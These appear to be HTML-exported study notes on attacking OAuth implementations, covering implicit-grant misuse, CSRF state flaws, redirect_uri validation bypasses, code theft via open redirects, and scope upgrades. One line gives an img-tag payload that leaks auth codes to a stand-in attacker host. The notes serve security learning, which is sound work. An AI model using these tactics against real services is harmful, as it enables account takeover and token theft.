<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Exploiting Vulnerabilities</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Exploiting Vulnerabilities</h1><br/><span style="text-decoration:underline;">OAuth Client App Vulnerabilities</span><br /><br /><strong>Improper implementation of implicit grant type</strong><br />• tokens are sent via the browser (grant type is designed for single page apps)<br />• userID and token value stored somewhere to maintain the session.<br />• POST request to have token associated with user (without a password, implicit trust)<br /><br /><strong>Flawed CSRF Protection</strong><br />• state param should contain unguessable value (hash tied to user)<br />   ◇ sort of like a csrf token<br /><br /><span style="text-decoration:underline;">OAuth Service Vulnerabilities</span><br /><br /><strong>Leaking Auth codes/access tokens</strong><br />• OAuth services reknowned for leaking it&#39;s own cookies via config settings<br />• Access victims data / compromise their account / log in as victim <br />• Dependent on grant type<br />• code/token set via call to /callback endpoint specified in redirect_uri<br />• IF Oauth doesn&#39;t validate, could construct CSRF (tricky victim browser into initiating OAuth flow)<br />• Steal the code before it is used, send code to /callback endpoint to get access to account<br />   ◇ Don&#39;t need to know client secret/access token if you have account access<br />• Using state or nonce potection doesn&#39;t prevent attacks.<br /><br /><strong>Flawed redirect_uri validation</strong><br />• Clients should provide an allowlist of genuine callback URI&#39;s (for validation)<br />• Still ways to bypass (play around with redirect_uri to understand its behaviour)<br />   ◇ maybe it only validates start/end of the input URI<br />   ◇ try adding multiple with &amp; (SSRF and CORS)<br />   ◇ duplicate redirect_uri parameters (maybe it only looks at first/second?)<br />   ◇ maybe localhost is permitted? register domain name localhost.badstuff.com.au<br /><br /><strong>Stealing codes / access tokens via proxy page</strong><br />• Try and get redirect_uri to point to other pages on allowlisted domain. <br />   ◇ Access those domains and play around with that.<br />• Dir Traversal to the end of valid URI&#39;s?<br />• Look for open redirects.<br />   ◇ Use this as a proxy to forward victims (with code/token) to your controlled domain<br />• Dangerous JS that handles query params / URL Fragments<br />• XSS Vulnerabilities<br />• HTML injection vulnerabilities<br />   ◇ Leak code via referer header: &lt;img src=&quot;evil-user.net&quot;&gt; (might send full URL in referer header of request)<br /><br /><strong>Flawed scope validation</strong><br />• User must always approve the requested access based on scope definted in auth request<br />• Token should only alow access to data in that scope approved.<br />• Can an attacker upgrade a token?<br />• Dependent on grant type:<br />• Scope Upgrade: Auth Code Flow<br />   ◇ Can&#39;t manipulate directly<br />   ◇ register own client with OAuth service<br />• Scope Upgrade: implicit flow<br />   ◇ manually add new scope param with stolen access token<br />   ◇ OAuth service should validate scope value, doesn&#39;t always happen<br /><br /><strong>Unverified user registration</strong><br />• Implicit assumption that OAuth data is correct<br />• Can be issues on the OAuth providers side.<br /><br /></div></body></html>